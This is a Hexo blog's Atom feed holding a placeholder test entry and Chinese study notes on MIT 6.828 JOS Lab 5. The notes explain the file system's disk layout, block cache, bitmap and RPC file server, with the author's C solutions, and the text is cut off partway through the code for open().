<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>C7</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://billyotry.github.io/"/>
  <updated>2021-02-28T13:21:57.128Z</updated>
  <id>https://billyotry.github.io/</id>
  
  <author>
    <name>C7</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>这是标题</title>
    <link href="https://billyotry.github.io/2099/01/01/test/"/>
    <id>https://billyotry.github.io/2099/01/01/test/</id>
    <published>2098-12-31T16:00:00.000Z</published>
    <updated>2021-02-28T13:21:57.128Z</updated>
    
    <content type="html"><![CDATA[<p><strong>just a test</strong></p><p> <img src="https://inews.gtimg.com/newsapp_ls/0/13071917630/0" alt="backgroud"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;just a test&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://inews.gtimg.com/newsapp_ls/0/13071917630/0&quot; alt=&quot;backgroud&quot;&gt;&lt;/p&gt;

      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>【MIT 6.828】JOS学习笔记 Lab5</title>
    <link href="https://billyotry.github.io/2021/08/24/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab5/"/>
    <id>https://billyotry.github.io/2021/08/24/%E3%80%90MIT6.828%E3%80%91JOS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20Lab5/</id>
    <published>2021-08-24T11:49:31.377Z</published>
    <updated>2021-08-28T15:02:30.853Z</updated>
    
    <content type="html"><![CDATA[<h1 id="File-system-preliminaries"><a href="#File-system-preliminaries" class="headerlink" title="File system preliminaries"></a>File system preliminaries</h1><p>我们要完成一个相对简单的文件系统，其可以实现创建、读、写以及删除在分层目录结构中组织的文件。目前，我们的OS只支持单用户，因此我们的文件系统也不支持UNIX文件拥有或权限的概念。同时不支持硬链接、符号链接、时间戳或者特别的设备文件。</p><h2 id="On-Disk-File-System-Structure"><a href="#On-Disk-File-System-Structure" class="headerlink" title="On-Disk File System Structure"></a>On-Disk File System Structure</h2><p>JOS的文件系统不适用inodes，所有文件的元数据都被存储在directory entry中。</p><p>文件和目录逻辑上都是由一系列数据block组成，这些blocks分散在磁盘中，文件系统屏蔽block分布的细节，提供一个可以顺序读写文件的接口。JOS文件系统允许用户读目录元数据，这就意味着用户可以扫描目录来像实现ls这种程序，UNIX没有采用这种方式的原因是，这种方式使得应用程序过度依赖目录元数据格式。</p><h3 id="Sectors-and-Blocks"><a href="#Sectors-and-Blocks" class="headerlink" title="Sectors and Blocks"></a>Sectors and Blocks</h3><p>大部分磁盘都是以为Sectors为粒度进行读写，JOS中Secotrs为512字节。文件系统以block为单位分配和使用磁盘。注意区别，secotr size是磁盘的属性，block size是操作系统使用磁盘的粒度。JOS文件系统的block size被定为4096字节。</p><h3 id="Superblocks"><a href="#Superblocks" class="headerlink" title="Superblocks"></a>Superblocks</h3><p>文件系统使用一些特殊的block保存文件系统属性元数据，比如block size，disk size，根目录位置等。这些特殊的block称为superblock。</p><p>我们的文件系统使用一个superblock，位于磁盘的block 1。block 0被用来保存boot loader和分区表。很多文件系统维护多个superblock，这样当一个损坏的时候，依然可以正常允许。</p><p>磁盘结构如下：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13923446162/0" alt="image-20210826233321315"></p><p>Super的结构如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Super</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> s_magic;       <span class="comment">// Magic number: FS_MAGIC</span></span><br><span class="line">    <span class="keyword">uint32_t</span> s_nblocks;     <span class="comment">// Total number of blocks on disk</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">File</span> <span class="title">s_root</span>;</span>     <span class="comment">// Root directory node</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="File-Meta-data"><a href="#File-Meta-data" class="headerlink" title="File Meta-data"></a>File Meta-data</h3><p>我们的文件系统使用struct File结构描述文件，该结构包含文件名、大小、类型，保存文件内容的block号。struct File结构的f_direct数组保存前NDIRECT(10)个block号，这样对于10*4096 = 40KB的文件不需要额外的空间来记录内容block号。对于更大的文件我们需要分配一个额外的block来保存，可容纳多达4096/4 = 1024个额外的block。所以我们的文件系统允许文件拥有1034个block。</p><p>File结构如下：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13923462031/0" alt="image-20210826234231996"></p><p>File结构定义在inc/fs.h中：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">File</span> &#123;</span></span><br><span class="line"><span class="keyword">char</span> f_name[MAXNAMELEN];<span class="comment">// filename</span></span><br><span class="line"><span class="keyword">off_t</span> f_size;<span class="comment">// file size in bytes</span></span><br><span class="line"><span class="keyword">uint32_t</span> f_type;<span class="comment">// file type</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Block pointers.</span></span><br><span class="line"><span class="comment">// A block is allocated iff its value is != 0.</span></span><br><span class="line"><span class="keyword">uint32_t</span> f_direct[NDIRECT];<span class="comment">// direct blocks</span></span><br><span class="line"><span class="keyword">uint32_t</span> f_indirect;<span class="comment">// indirect block</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Pad out to 256 bytes; must do arithmetic in case we&#x27;re compiling</span></span><br><span class="line"><span class="comment">// fsformat on a 64-bit machine.</span></span><br><span class="line"><span class="keyword">uint8_t</span> f_pad[<span class="number">256</span> - MAXNAMELEN - <span class="number">8</span> - <span class="number">4</span>*NDIRECT - <span class="number">4</span>];</span><br><span class="line">&#125; __attribute__((packed));<span class="comment">// required only on some 64-bit machines</span></span><br></pre></td></tr></table></figure><h3 id="Directories-versus-Regular-Files"><a href="#Directories-versus-Regular-Files" class="headerlink" title="Directories versus Regular Files"></a>Directories versus Regular Files</h3><p>File结构既能代表文件也能代表目录，由type字段取分，文件系统以相同的方式管理文件和目录，只是目录文件的内容是一系列File结构，这些File结构描述了在该目录下的文件或者子目录。</p><p>超级块包含一个File结构，代码文件系统的根目录。</p><h1 id="The-File-System"><a href="#The-File-System" class="headerlink" title="The File System"></a>The File System</h1><p>我们实现的文件系统的关键部分，读数据到缓存中并能写回磁盘；分配磁盘块；将文件偏移映射到磁盘块；并在IPC接口中实现读，写和打开。</p><h2 id="Disk-Access"><a href="#Disk-Access" class="headerlink" title="Disk Access"></a>Disk Access</h2><p>到目前为之内核还没有访问磁盘的能力。JOS不像其他操作系统一样在内核添加磁盘驱动，然后提供系统调用。我们实现一个文件系统进程来作为磁盘驱动。</p><p>x86处理器使用EFLAGS寄存器的IOPL位来控制保护模式下的代码能否执行设备IO指令，比如in和out。我们希望文件系统进程能访问IO空间，其他进程不能。</p><p><strong>exercise1</strong></p><p>创建一个文件系统进程，其实它和普通的进程差不多，就是能够读写IO设备。所以我们给它加上权限。</p><p>env_create修改为如下代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">env_create(<span class="keyword">uint8_t</span> *binary, <span class="keyword">enum</span> EnvType type)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// If this is the file server (type == ENV_TYPE_FS) give it I/O privileges.</span></span><br><span class="line"><span class="comment">// LAB 5: Your code here.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">e</span>;</span></span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="keyword">if</span>(env_alloc(&amp;e,<span class="number">0</span>) != <span class="number">0</span>)&#123;</span><br><span class="line">panic(<span class="string">&quot;env_alloc(): env_alloc failed!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(type == ENV_TYPE_FS)&#123;</span><br><span class="line">e-&gt;env_tf.tf_eflags |= FL_IOPL_MASK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">load_icode(e,binary);</span><br><span class="line">e-&gt;env_type = type;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Question</p><ol><li><p>你是否不得不做一些其他事来确保当环境不断切换时，I/O特权设定依然能被保存和恢复？ 为什么？</p><p>不需要，因为我们切换环境的时候，会保存我们的EFLAGS寄存器，然后切换回来的时候，又会恢复。</p></li></ol></blockquote><h2 id="The-Block-Cache"><a href="#The-Block-Cache" class="headerlink" title="The Block Cache"></a>The Block Cache</h2><p>我们的文件系统最大支持3GB，文件系统进程保留0x10000000(DISKMAP)到0xD0000000(DISKMAP+DISKMAX)固定3GB的内存空间作为磁盘的缓存。比如block 0被映射到虚拟地址0x10000000，block 1被映射到虚拟地址0x10001000，以此类推。</p><p>刚开始还纳闷怎么给这么多的空间，后来想到我们的环境间虚拟空间都是独立的，并且我们的文件系统环境唯一需要做的事情就是实现文件是access，那么给这么大的空间也是合情合理。</p><p>如果将整个磁盘全部读到内存将非常耗时，所以我们将实现按需加载，只有当访问某个block对应的内存地址时出现页错误，才将block从磁盘加载到对应的内存区域，然后重新执行内存访问指令。</p><p><strong>exercise2</strong></p><p>bc_pgfault是FS进程缺页处理函数，负责将数据从磁盘读取到对应内存。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">bc_pgfault(struct UTrapframe *utf)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">void</span> *addr = (<span class="keyword">void</span> *) utf-&gt;utf_fault_va;</span><br><span class="line"><span class="keyword">uint32_t</span> blockno = ((<span class="keyword">uint32_t</span>)addr - DISKMAP) / BLKSIZE;</span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check that the fault was within the block cache region</span></span><br><span class="line"><span class="keyword">if</span> (addr &lt; (<span class="keyword">void</span>*)DISKMAP || addr &gt;= (<span class="keyword">void</span>*)(DISKMAP + DISKSIZE))</span><br><span class="line">panic(<span class="string">&quot;page fault in FS: eip %08x, va %08x, err %04x&quot;</span>,</span><br><span class="line">      utf-&gt;utf_eip, addr, utf-&gt;utf_err);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanity check the block number.</span></span><br><span class="line"><span class="keyword">if</span> (super &amp;&amp; blockno &gt;= super-&gt;s_nblocks)</span><br><span class="line">panic(<span class="string">&quot;reading non-existent block %08x\n&quot;</span>, blockno);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate a page in the disk map region, read the contents</span></span><br><span class="line"><span class="comment">// of the block from the disk into that page.</span></span><br><span class="line"><span class="comment">// Hint: first round addr to page boundary. fs/ide.c has code to read</span></span><br><span class="line"><span class="comment">// the disk.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// LAB 5: you code here:</span></span><br><span class="line">addr = ROUNDDOWN(addr,PGSIZE);</span><br><span class="line">sys_page_alloc(<span class="number">0</span>, addr, PTE_W|PTE_U|PTE_P);</span><br><span class="line"><span class="keyword">uint32_t</span> secnum = blockno * BLKSECTS;</span><br><span class="line"><span class="keyword">if</span>((r = ide_read(secnum,addr,BLKSECTS)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">panic(<span class="string">&quot;ide_read(): %e\n&quot;</span>,r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Clear the dirty bit for the disk block page since we just read the</span></span><br><span class="line"><span class="comment">// block from disk</span></span><br><span class="line"><span class="keyword">if</span> ((r = sys_page_map(<span class="number">0</span>, addr, <span class="number">0</span>, addr, uvpt[PGNUM(addr)] &amp; PTE_SYSCALL)) &lt; <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;in bc_pgfault, sys_page_map: %e&quot;</span>, r);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check that the block we read was allocated. (exercise for</span></span><br><span class="line"><span class="comment">// the reader: why do we do this *after* reading the block</span></span><br><span class="line"><span class="comment">// in?)</span></span><br><span class="line"><span class="keyword">if</span> (bitmap &amp;&amp; block_is_free(blockno))</span><br><span class="line">panic(<span class="string">&quot;reading free block %08x\n&quot;</span>, blockno);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flush_block()将一个block写入磁盘。flush_block()不需要做任何操作，如果block没有在内存或者block没有被写过。可以通过PTE的PTE_D位判断该block有没有被写过。注释基本写得很详细了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">flush_block(<span class="keyword">void</span> *addr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> blockno = ((<span class="keyword">uint32_t</span>)addr - DISKMAP) / BLKSIZE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (addr &lt; (<span class="keyword">void</span>*)DISKMAP || addr &gt;= (<span class="keyword">void</span>*)(DISKMAP + DISKSIZE))</span><br><span class="line">panic(<span class="string">&quot;flush_block of bad va %08x&quot;</span>, addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 5: Your code here.</span></span><br><span class="line"><span class="comment">//panic(&quot;flush_block not implemented&quot;);</span></span><br><span class="line">addr = ROUNDDOWN(addr,PGSIZE);</span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line"><span class="keyword">uint32_t</span> secnum = blockno * BLKSECTS;</span><br><span class="line"><span class="keyword">if</span>(va_is_mapped(addr) &amp;&amp; va_is_dirty(addr))&#123;<span class="comment">//如果addr还没有映射过或者该页载入到内存后还没有被写过，does nothing</span></span><br><span class="line">ide_write(secnum,addr,BLKSECTS);<span class="comment">//写回到磁盘</span></span><br><span class="line"><span class="keyword">if</span> ((r = sys_page_map(<span class="number">0</span>, addr, <span class="number">0</span>, addr, uvpt[PGNUM(addr)] &amp; PTE_SYSCALL)) &lt; <span class="number">0</span>)<span class="comment">//清空PTE_D位</span></span><br><span class="line">panic(<span class="string">&quot;in bc_pgfault, sys_page_map: %e&quot;</span>, r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fs/fs.c中的fs_init()将会初始化super和bitmap全局指针变量。至此对于文件系统进程只要访问虚拟内存[DISKMAP, DISKMAP+DISKMAX]范围中的地址addr，就会访问到磁盘((uint32_t)addr - DISKMAP) / BLKSIZE block中的数据。如果block数据还没复制到内存物理页，bc_pgfault()缺页处理函数会将数据从磁盘拷贝到某个物理页，并且将addr映射到该物理页。这样FS进程只需要访问虚拟地址空间[DISKMAP, DISKMAP+DISKMAX]就能访问磁盘了。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13927193876/0" alt="image-20210828013331417"></p><h2 id="The-Block-Bitmap"><a href="#The-Block-Bitmap" class="headerlink" title="The Block Bitmap"></a>The Block Bitmap</h2><p>fs_init已经初始化了bitmap，我们能通过bitmap访问磁盘的block 1，也就是位数组，每一位代表一个block，1表示该block未被使用，0表示已被使用。我们实现一系列管理函数来管理这个数组。</p><p><strong>exercise3</strong></p><p>实现fs/fs.c中的alloc_block()，该函数搜索bitmap位数组，返回一个未使用的block，并将其标记为已使用。这里可以参考上面的free_block，而且我们要注意1代表未使用，0代表已使用。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">alloc_block(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// The bitmap consists of one or more blocks.  A single bitmap block</span></span><br><span class="line"><span class="comment">// contains the in-use bits for BLKBITSIZE blocks.  There are</span></span><br><span class="line"><span class="comment">// super-&gt;s_nblocks blocks in the disk altogether.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 5: Your code here.</span></span><br><span class="line"><span class="comment">//panic(&quot;alloc_block not implemented&quot;);</span></span><br><span class="line"><span class="keyword">uint32_t</span> bmpblock_start = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">uint32_t</span> blockno = <span class="number">1</span>;blockno &lt; super-&gt;s_nblocks;blockno++)&#123;</span><br><span class="line"><span class="keyword">if</span>(block_is_free(blockno))&#123;</span><br><span class="line">bitmap[blockno/<span class="number">32</span>] &amp;= ~(<span class="number">1</span>&lt;&lt;(blockno%<span class="number">32</span>));</span><br><span class="line">flush_block(&amp;bitmap[blockno/<span class="number">32</span>]);</span><br><span class="line"><span class="keyword">return</span> blockno;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> -E_NO_DISK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="File-Operations"><a href="#File-Operations" class="headerlink" title="File Operations"></a>File Operations</h2><p>fs/fs.c文件提供了一系列函数用于管理File结构，扫描和管理目录文件，解析绝对路径。<br>基本的文件系统操作：</p><ol><li><code>file_block_walk(struct File *f, uint32_t filebno, uint32_t **ppdiskbno, bool alloc)</code>：查找f指向文件结构的第filebno个block的存储地址，保存到ppdiskbno中。如果f-&gt;f_indirect还没有分配，且alloc为真，那么将分配要给新的block作为该文件的f-&gt;f_indirect。类比页表管理pgdir_walk()。</li><li><code>file_get_block(struct File *f, uint32_t filebno, char **blk)</code>：该函数查找文件第filebno个block对应的虚拟地址addr，并将其保存到blk地址处。</li><li><code>walk_path(const char *path, struct File **pdir, struct File **pf, char *lastelem)</code>：解析路径path，填充pdir和pf地址处的File结构。比如/aa/bb/cc.c那么pdir代表指向bb目录的File结构，pf指向代表cc.c文件的File结构。又比如/aa/bb/cc.c，但是此时cc.c还不存在，那么pdir依旧指向代表bb目录的File结构，但是pf地址处应该为0，lastelem指向的字符串应该是cc.c。</li><li><code>dir_lookup(struct File *dir, const char *name, struct File **file)</code>：该函数查找dir指向的文件内容，寻找File.name为name的File结构，并保存到file地址处。</li><li><code>dir_alloc_file(struct File *dir, struct File **file)</code>：在dir目录文件的内容中寻找一个未被使用的File结构，将其地址保存到file的地址处。</li></ol><p>文件操作：</p><ol><li><code>file_create(const char *path, struct File **pf)</code>：创建path，如果创建成功pf指向新创建的File指针</li><li><code>file_open(const char *path, struct File **pf)</code>：寻找path对应的File结构地址，保存到pf地址处。</li><li><code>file_read(struct File *f, void *buf, size_t count, off_t offset)</code>：从文件f中的offset字节处读取count字节到buf处</li><li><code>file_write(struct File *f, const void *buf, size_t count, off_t offset)</code>：将buf处的count字节写到文件f的offset开始的位置。</li></ol><p><strong>exercise4</strong></p><p>file_block_walk():</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">file_block_walk(struct File *f, <span class="keyword">uint32_t</span> filebno, <span class="keyword">uint32_t</span> **ppdiskbno, <span class="keyword">bool</span> alloc)</span><br><span class="line">&#123;</span><br><span class="line">       <span class="comment">// LAB 5: Your code here.</span></span><br><span class="line">       <span class="comment">//panic(&quot;file_block_walk not implemented&quot;);</span></span><br><span class="line">   <span class="keyword">int</span> bn;</span><br><span class="line">   <span class="keyword">uint32_t</span> *indirects;</span><br><span class="line">   <span class="comment">//out of range</span></span><br><span class="line">   <span class="keyword">if</span>(filebno &gt;= NDIRECT + NINDIRECT)&#123;</span><br><span class="line">   <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//filebno在前10个block中</span></span><br><span class="line">   <span class="keyword">if</span>(filebno &lt; NDIRECT)&#123;</span><br><span class="line">   *ppdiskbno = &amp;(f-&gt;f_direct[filebno]);</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(f-&gt;f_indirect)&#123;</span><br><span class="line">   indirects = diskaddr(f-&gt;f_indirect);</span><br><span class="line">   *ppdiskbno = &amp;(indirects[filebno - NDIRECT]);</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(!alloc) <span class="keyword">return</span> -E_NOT_FOUND;</span><br><span class="line">   <span class="keyword">if</span>((bn = alloc_block()) &lt; <span class="number">0</span>) <span class="keyword">return</span> bn;</span><br><span class="line">   f-&gt;f_indirect = bn;</span><br><span class="line">   flush_block(diskaddr(bn));</span><br><span class="line">   indirects = diskaddr(bn);</span><br><span class="line">   *ppdiskbno = &amp;(indirects[filebno - NDIRECT]);</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="The-file-system-interface"><a href="#The-file-system-interface" class="headerlink" title="The file system interface"></a>The file system interface</h2><p>到目前为止，文件系统进程已经能提供各种操作文件的功能了，但是其他用户进程不能直接调用这些函数。我们通过进程间函数调用(RPC)对其它进程提供文件系统服务。RPC机制原理如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">      Regular env           FS env</span><br><span class="line">   +---------------+   +---------------+</span><br><span class="line">   |      read     |   |   file_read   |</span><br><span class="line">   |   (lib&#x2F;fd.c)  |   |   (fs&#x2F;fs.c)   |</span><br><span class="line">...|.......|.......|...|.......^.......|...............</span><br><span class="line">   |       v       |   |       |       | RPC mechanism</span><br><span class="line">   |  devfile_read |   |  serve_read   |</span><br><span class="line">   |  (lib&#x2F;file.c) |   |  (fs&#x2F;serv.c)  |</span><br><span class="line">   |       |       |   |       ^       |</span><br><span class="line">   |       v       |   |       |       |</span><br><span class="line">   |     fsipc     |   |     serve     |</span><br><span class="line">   |  (lib&#x2F;file.c) |   |  (fs&#x2F;serv.c)  |</span><br><span class="line">   |       |       |   |       ^       |</span><br><span class="line">   |       v       |   |       |       |</span><br><span class="line">   |   ipc_send    |   |   ipc_recv    |</span><br><span class="line">   |       |       |   |       ^       |</span><br><span class="line">   +-------|-------+   +-------|-------+</span><br><span class="line">           |                   |</span><br><span class="line">           +-------------------+</span><br></pre></td></tr></table></figure><p>本质上RPC还是借助IPC机制实现的，普通进程通过IPC向FS进程间发送具体操作和操作数据，然后FS进程执行文件操作，最后又将结果通过IPC返回给普通进程。从上图中可以看到客户端的代码在lib/fd.c和lib/file.c两个文件中。服务端的代码在fs/fs.c和fs/serv.c两个文件中。</p><p>相关数据结构关系：</p><p><img src="https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.828/lab5/lab5_4_%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.png" alt="文件系统相关数据结构关系"></p><p>文件系统服务端代码在fs/serv.c中，serve()中有一个无限循环，接收IPC请求，将对应的请求分配到对应的处理函数，然后将结果通过IPC发送回去。<br>对于客户端来说：发送一个32位的值作为请求类型，发送一个Fsipc结构作为请求参数，该数据结构通过IPC的页共享发给FS进程，在FS进程可以通过访问fsreq(0x0ffff000)来访问客户进程发来的Fsipc结构。<br>对于服务端来说：FS进程返回一个32位的值作为返回码，对于FSREQ_READ和FSREQ_STAT这两种请求类型，还额外通过IPC返回一些数据。</p><p><strong>exercise5</strong></p><p>实现fs/serv.c中的serve_read()。这是服务端也就是FS进程中的函数。直接调用更底层的fs/fs.c中的函数来实现。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">serve_read(<span class="keyword">envid_t</span> envid, <span class="keyword">union</span> Fsipc *ipc)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Fsreq_read</span> *<span class="title">req</span> =</span> &amp;ipc-&gt;read;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Fsret_read</span> *<span class="title">ret</span> =</span> &amp;ipc-&gt;readRet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (debug)</span><br><span class="line">cprintf(<span class="string">&quot;serve_read %08x %08x %08x\n&quot;</span>, envid, req-&gt;req_fileid, req-&gt;req_n);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Lab 5: Your code here:</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">OpenFile</span> *<span class="title">o</span>;</span></span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line">r = openfile_lookup(envid,req-&gt;req_fileid,&amp;o); <span class="comment">//通过fileid找到Openfile结构</span></span><br><span class="line"><span class="keyword">if</span>(r &lt; <span class="number">0</span>) <span class="keyword">return</span> r;</span><br><span class="line"><span class="keyword">if</span>((r = file_read(o-&gt;o_file,ret-&gt;ret_buf,req-&gt;req_n,o-&gt;o_fd-&gt;fd_offset)) &lt; <span class="number">0</span>) <span class="keyword">return</span> r; <span class="comment">//调用fs.c中函数进行真正的读操作</span></span><br><span class="line">o-&gt;o_fd-&gt;fd_offset += r;</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>exercise6</strong></p><p>实现fs/serv.c中的serve_write()和lib/file.c中的devfile_write()。<br>serve_write():</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">serve_write(<span class="keyword">envid_t</span> envid, struct Fsreq_write *req)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (debug)</span><br><span class="line">cprintf(<span class="string">&quot;serve_write %08x %08x %08x\n&quot;</span>, envid, req-&gt;req_fileid, req-&gt;req_n);</span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 5: Your code here.</span></span><br><span class="line"><span class="comment">//panic(&quot;serve_write not implemented&quot;);</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">OpenFile</span> *<span class="title">o</span>;</span></span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line"><span class="keyword">if</span>((r = openfile_lookup(envid,req-&gt;req_fileid,&amp;o)) &lt; <span class="number">0</span>) <span class="keyword">return</span> r;</span><br><span class="line"><span class="keyword">int</span> total = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">r = file_write(o-&gt;o_file,req-&gt;req_buf,req-&gt;req_n,o-&gt;o_fd-&gt;fd_offset);</span><br><span class="line"><span class="keyword">if</span>(r &lt; <span class="number">0</span>) <span class="keyword">return</span> r;</span><br><span class="line">total += r;</span><br><span class="line">o-&gt;o_fd-&gt;fd_offset += r;</span><br><span class="line"><span class="keyword">if</span>(req-&gt;req_n &lt;= total) <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>devfile_write():客户端进程函数，包装一下参数，直接调用fsipc()将参数发送给FS进程处理。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span><br><span class="line">devfile_write(struct Fd *fd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Make an FSREQ_WRITE request to the file system server.  Be</span></span><br><span class="line"><span class="comment">// careful: fsipcbuf.write.req_buf is only so large, but</span></span><br><span class="line"><span class="comment">// remember that write is always allowed to write *fewer*</span></span><br><span class="line"><span class="comment">// bytes than requested.</span></span><br><span class="line"><span class="comment">// LAB 5: Your code here</span></span><br><span class="line"><span class="comment">//panic(&quot;devfile_write not implemented&quot;);</span></span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line">fsipcbuf.write.req_fileid = fd-&gt;fd_file.id;</span><br><span class="line">fsipcbuf.write.req_n = n;</span><br><span class="line">memmove(fsipcbuf.write.req_buf,buf,n);</span><br><span class="line"><span class="keyword">return</span> fsipc(FSREQ_WRITE,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="库函数open-实现"><a href="#库函数open-实现" class="headerlink" title="库函数open()实现"></a>库函数open()实现</h2><p>以打开一个文件为例，看下整体过程，read(), write()类似。open()在linux中也要实现定义在头文件&lt;fcntl.h&gt;中，原型如下:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure><p>在JOS中open()实现在lib/file.c中，</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">open(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Find an unused file descriptor page using fd_alloc.</span></span><br><span class="line">    <span class="comment">// Then send a file-open request to the file server.</span></span><br><span class="line">    <span class="comment">// Include &#x27;path&#x27; and &#x27;omode&#x27; in request,</span></span><br><span class="line">    <span class="comment">// and map the returned file descriptor page</span></span><br><span class="line">    <span class="comment">// at the appropriate fd address.</span></span><br><span class="line">    <span class="comment">// FSREQ_OPEN returns 0 on success, &lt; 0 on failure.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// (fd_alloc does not allocate a page, it just returns an</span></span><br><span class="line">    <span class="comment">// unused fd address. Do you need to allocate a page?)</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Return the file descriptor index.</span></span><br><span class="line">    <span class="comment">// If any step after fd_alloc fails, use fd_close to free the</span></span><br><span class="line">    <span class="comment">// file descriptor.</span></span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Fd</span> *<span 